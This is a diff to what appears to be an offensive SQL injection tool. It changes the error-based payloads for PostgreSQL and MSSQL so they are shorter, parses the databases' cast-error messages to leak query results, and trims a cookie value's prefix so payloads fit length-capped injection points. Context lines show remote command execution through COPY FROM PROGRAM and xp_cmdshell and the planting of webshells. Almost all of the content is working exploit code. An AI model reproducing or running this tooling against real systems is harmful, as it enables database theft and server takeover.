@@ -70,7 +70,7 @@ RCE_TABLE = "bf_rce"              # scratch table that captures command output
 UMARK = "bfUc"                   # UNION column-reflection probe
 ULEFT, URIGHT = "bfUL", "bfUR"   # markers wrapped around a UNION-extracted value
 
-VERSION = "3.6.2"
+VERSION = "3.6.3"
 _RED, _RESET = "\033[1;31m", "\033[0m"   # bold red
 _ART = r"""
  ____  _      _____ _   _ _____  ______ ____  _      _____
@@ -171,7 +171,14 @@ class Postgres(Dbms):
     def sleep_stacked(self, cond, sleep):
         return f"SELECT pg_sleep({sleep}) WHERE {cond}"
     def error_expr(self, inner):
-        return f"1=CAST(('{DELIM}'||({inner})||'{DELIM}') AS int)"
+        # '~' forces the int-cast to fail even for numeric values; no bulky delimiter
+        # wrapper, so the payload stays short enough to survive length-capped points.
+        return f"1=CAST(('~'||({inner})) AS int)"
+    def error_value(self, text):
+        # read the value from the integer-cast error itself. Anchoring to that message
+        # (not a bare delimiter) means a query echoed back in the page can't fool us.
+        m = re.search(r'invalid input syntax for (?:type )?integer:\s*"~(.*?)"', text)
+        return m.group(1) if m else None
     # RCE: COPY ... FROM PROGRAM (superuser) for exec; COPY (...) TO for webshell.
     can_exec = True
     can_webshell = True
@@ -257,7 +264,10 @@ class MSSQL(Dbms):
     def sleep_stacked(self, cond, sleep):
         return f"IF ({cond}) WAITFOR DELAY '0:0:{max(1, int(round(sleep)))}'"
     def error_expr(self, inner):
-        return f"1=CAST(('{DELIM}'+CAST(({inner}) AS varchar(8000))+'{DELIM}') AS int)"
+        return f"1=CAST(('~'+CAST(({inner}) AS varchar(8000))) AS int)"
+    def error_value(self, text):
+        m = re.search(r"converting the (?:var|n?var|n)?char value '~(.*?)'", text)
+        return m.group(1) if m else None
     # RCE: enable + xp_cmdshell (sysadmin). Output captured into a table, read via oracle.
     can_exec = True
     def rce_setup(self):
@@ -440,6 +450,15 @@ class Target:
         if a.marker not in blob:
             raise SystemExit(f"[!] marker {a.marker!r} not found in the request — place it at the "
                              f"injection point (e.g. TrackingId=abc{a.marker} in the cookie).")
+        # the run of value chars right before the marker (e.g. a tracking-id) is deletable:
+        # dropping it frees length budget on a capped point without affecting the injection
+        # (the breakout quote ignores whatever string content preceded it).
+        _f = next((s for s in [self.url or "", self.data or ""] + list(self.headers.values())
+                   if a.marker in s), "")
+        _m = re.search(r"([^=&;,\"'/?\s]*)" + re.escape(a.marker), _f)
+        self.marker_prefix = _m.group(1) if _m else ""
+        self.trim_prefix = False
+        self._trim_announced = False
         self.session = requests.Session()    # keep-alive + cookie persistence
         self._baseline = None
         names = [t.strip() for t in (getattr(a, "tamper", None) or "").split(",") if t.strip()]
@@ -478,7 +497,19 @@ class Target:
         return urllib.parse.quote_plus(p) if self.a.encode else p
 
     def _put(self, s, payload):
-        return s.replace(self.a.marker, payload) if s else s
+        if not s:
+            return s
+        if self.trim_prefix and self.marker_prefix:
+            cut = self.marker_prefix + self.a.marker        # drop the deletable prefix too
+            if cut in s:
+                return s.replace(cut, payload)
+        return s.replace(self.a.marker, payload)
+
+    def _announce_trim(self):
+        if not self._trim_announced:
+            self._trim_announced = True
+            print(f"[*] length cap suspected — dropped the {len(self.marker_prefix)}-char "
+                  f"injection prefix to free room (its value isn't needed for the injection)")
 
     def send(self, payload):
         d = getattr(self.a, "delay", 0.0)          # pace requests (avoid rate-limit / 504 tar-pit)
@@ -815,6 +846,13 @@ def detect(target, a):
     if not (a.force_boolean or a.force_time) and not a.no_error:
         ecands = [dbms] if dbms else candidates
         ed, err_ctx = find_error(target, a, contexts, ecands)
+        if not ed and target.marker_prefix and not target.trim_prefix:
+            target.trim_prefix = True                 # a length cap may be truncating the probe
+            ed, err_ctx = find_error(target, a, contexts, ecands)
+            if ed:
+                target._announce_trim()
+            else:
+                target.trim_prefix = False
         if ed:
             return Detection("error-based", ed, err_ctx, err_ctx=err_ctx)
 
@@ -845,7 +883,12 @@ def extract_error(target, dbms, ctx, a, query=None):
     query = query if query is not None else a.query
     def leak(inner):
         p = f"{ctx.close}{ctx.logic}{dbms.error_expr(inner)}{dbms.comment}"
-        return dbms.error_value(target.send(p).text)
+        tok = dbms.error_value(target.send(p).text)
+        if tok is None and target.marker_prefix and not target.trim_prefix:
+            target.trim_prefix = True                 # likely a length cap: free room and retry
+            target._announce_trim()
+            tok = dbms.error_value(target.send(p).text)
+        return tok
 
     if not dbms.error_trunc:
         tok = leak(f"({query})")
